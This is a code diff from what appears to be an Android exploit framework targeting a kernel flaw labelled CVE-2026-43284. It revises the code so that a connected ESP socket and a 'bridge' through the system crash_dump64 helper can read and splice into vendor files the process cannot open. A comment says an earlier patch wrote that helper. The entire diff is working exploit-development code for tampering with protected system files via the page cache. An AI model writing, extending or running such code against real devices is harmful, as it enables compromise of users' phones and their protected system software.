@@ -429,17 +429,20 @@ namespace ghostlock::jni {
      */
     class PairedDoor final : public backend::cve_2026_43284::landing::DoorOps {
       public:
-        PairedDoor(const int file_fd, const int socket_fd) noexcept : file_fd_(file_fd), socket_fd_(socket_fd) {}
+        PairedDoor(const int file_fd, const int socket_fd, const bool remote = false) noexcept
+            : file_fd_(file_fd), socket_fd_(socket_fd), remote_(remote) {}
 
         [[nodiscard]] int open_target() noexcept override { return file_fd_; }
         [[nodiscard]] int connect_esp(const backend::cve_2026_43284::SaMaterial &) noexcept override {
             return socket_fd_;  /* 已经连好了，这里只交出去 */
         }
         void close_fd(const int) noexcept override { /* 不拥有 fd：由 closeTarget/closeSocket 关 */ }
-        [[nodiscard]] bool target_is_remote() const noexcept override { return false; }
+        [[nodiscard]] bool target_is_remote() const noexcept override { return remote_; }
 
       private:
         int file_fd_ = -1;
+        /** 载体是本进程打不开的 vendor 文件：没有 fd 不是失败（桥负责读写）。 */
+        bool remote_ = false;
         int socket_fd_ = -1;
     };
 
@@ -533,18 +536,19 @@ namespace ghostlock::jni {
                     /* 载体是本进程打不开的 vendor 文件：读与写都经 patch #1 写下的 helper（桥）。 */
                     const std::string &carrier = g_doors[target_slot].path;
                     const char *helper_path = "/apex/com.android.runtime/bin/crash_dump64";
-                    surface->linux_door = std::make_unique<backend::cve_2026_43284::landing::PageCacheDoorLinux>(
-                        carrier.c_str(), carrier.size());
+                    /* 远端门用**带标志的 PairedDoor**：它交出的正是已连好的那条套接字，
+                     * 不会像 PageCacheDoorLinux 那样再自建一条（那会与同一 SA 的端口冲突 ⇒ EADDRINUSE ⇒ open 失败）。 */
+                    surface->door = std::make_unique<PairedDoor>(-1, g_sockets[socket_slot], true);
                     auto bridge = std::make_unique<backend::cve_2026_43284::landing::CrashDumpBridge>();
                     if (!bridge->bind(helper_path, std::strlen(helper_path), carrier.c_str(), carrier.size())) {
                         GL_LOGI("surface: bridge refused helper=%s carrier=%s", helper_path, carrier.c_str());
                         return 0U;
                     }
-                    surface->remote = std::make_unique<backend::cve_2026_43284::landing::RemoteDoor>(*surface->linux_door);
+
                     surface->io = std::make_unique<backend::cve_2026_43284::landing::RealSpliceIo>(
                         backend::cve_2026_43284::landing::real_splice_io(), -1, 0,
                         bridge->old_page(), bridge->helper());
-                    surface->doors_ops = surface->remote.get();
+                    surface->doors_ops = surface->door.get();
                     surface->target_remote = true;
                     surface->bridge = std::move(bridge);
                     GL_LOGI("surface: slot=%zu carrier is remote (%s) -> the bridge reads and splices it",
